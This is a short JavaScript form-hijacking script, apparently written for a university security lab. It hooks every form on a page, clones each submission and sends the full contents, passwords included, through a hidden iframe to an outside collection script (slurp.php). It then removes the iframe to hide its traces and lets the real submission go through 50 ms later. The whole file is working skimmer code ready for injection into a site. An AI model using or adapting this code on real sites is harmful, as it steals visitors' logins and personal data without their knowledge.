const SAVER_URL="http://www.rose-hulman.edu/~stammsl/csse442/lab/lab4/slurp.php";
const GROUP="penguin";

/**
 * Code to attach to all forms in this document
 */
var frms = document.getElementsByTagName("form");
for (i=0; i<frms.length; i++) {
  hijack(frms.item(i));
}
function hijack(frmObj) {
  var delayCode = "";
  if (frmObj.hasAttribute("onsubmit")) {
    delayCode = frmObj.getAttribute("onsubmit");
  }
  frmObj.setAttribute("onsubmit", "return leech(this,function(){" + delayCode + "});");
}

/**
 * Copies and submits a form objectâ€™s complete contents
 */
function leech(frmObj, delayCode) {
  //create a copy of the existing form, with unique ID
  var rnd = Math.floor(Math.random() * 256);
  var newFrm = frmObj.cloneNode(true);
  //deep clone
  newFrm.setAttribute("id", "leechedID" + rnd);
  newFrm.setAttribute("target", "hiddenframe" + newFrm.id);
  newFrm.setAttribute("action", SAVER_URL);
  newFrm.setAttribute("method", "GET");

  var elt = document.createElement("input");
  elt.setAttribute("type", "hidden");
  elt.setAttribute("name", "442team");
  elt.setAttribute("value", GROUP);
  newFrm.appendChild(elt);

  //create an iframe to hide the form submission.
  var hiddenIframe = document.createElement("iframe");
  //hiddenIframe.setAttribute("style", "position:absolute;" + "visibility:hidden;z-index:0;");
  hiddenIframe.setAttribute("style", "position:absolute;");
  hiddenIframe.setAttribute("name", "hiddenframe" + newFrm.id);
  //add form to hidden iframe and iframe to the document
  hiddenIframe.appendChild(newFrm);
  window.document.body.appendChild(hiddenIframe);
  //do stealthy submission of hijacked form
  newFrm.submit();
  // Prevent race-winning by setting event for the future.
  // This real form submission happens 50ms after the hijacked one.
  setTimeout(function() {
    //hide traces of the dual submit
    window.document.body.removeChild(hiddenIframe);
    //emulate the onSubmit handler by evaluating given code
    if (delayCode() != false) { frmObj.submit(); }
  }, 50);
  //disallow other submission just yet
  return false;
}
